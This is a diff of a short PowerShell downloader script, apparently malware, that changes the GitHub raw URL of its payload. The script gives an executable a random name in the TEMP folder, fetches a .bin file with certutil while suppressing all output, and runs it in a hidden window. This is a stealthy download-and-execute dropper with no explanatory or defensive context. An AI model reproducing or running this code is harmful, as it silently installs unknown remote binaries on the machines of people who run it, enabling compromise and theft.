@@ -1,9 +1,9 @@
-——————————
+
 
 $randomSuffix = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
 $targetExe = "$env:TEMP\$randomSuffix.exe"
 
-certutil -urlfetch -verify -f "https://github.com/0x699/mrc/raw/refs/heads/main/sihost.bin" "$targetExe" >$null 2>&1
+certutil -urlfetch -verify -f "https://github.com/MB2RZEN/yio/raw/refs/heads/main/sqi.bin" "$targetExe" >$null 2>&1
 
 Start-Process -FilePath $targetExe -WindowStyle Hidden -PassThru | Out-Null
 
